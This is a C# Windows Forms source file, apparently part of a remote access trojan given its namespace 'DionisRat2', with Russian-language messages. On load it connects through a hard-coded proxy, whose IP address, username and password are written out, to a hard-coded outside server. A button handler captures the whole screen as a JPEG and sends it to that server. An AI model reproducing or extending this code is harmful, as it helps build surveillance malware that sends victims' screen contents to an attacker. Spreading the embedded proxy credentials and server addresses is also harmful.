using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DionisRat2
{
    public partial class Form1 : Form
    {
        private TcpClientWrapper tcpClient;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            InitializeTcpClient();
        }

        private void InitializeTcpClient()
        {
            string proxyIp = "185.246.220.176";
            int proxyPort = 64412;
            string proxyUsername = "B3us57G2";
            string proxyPassword = "3mpRRj3q";
            string serverIp = "147.45.42.250";
            int serverPort = 12345;

            try
            {
                tcpClient = new TcpClientWrapper(proxyIp, proxyPort, proxyUsername, proxyPassword, serverIp, serverPort);
                MessageBox.Show("Подключение успешно установлено через прокси.");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка подключения: {ex.Message}");
            }
        }

        private async void btnSendText_Click(object sender, EventArgs e)
        {

        }

        private async void btnSendScreenshot_Click(object sender, EventArgs e)
        {
            await SendScreenshotAsync();
        }

        private async Task SendScreenshotAsync()
        {
            try
            {
                using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string response = await tcpClient.SendRequestAsync(imageBytes);
                        MessageBox.Show(response);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка захвата экрана: {ex.Message}");
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            tcpClient?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
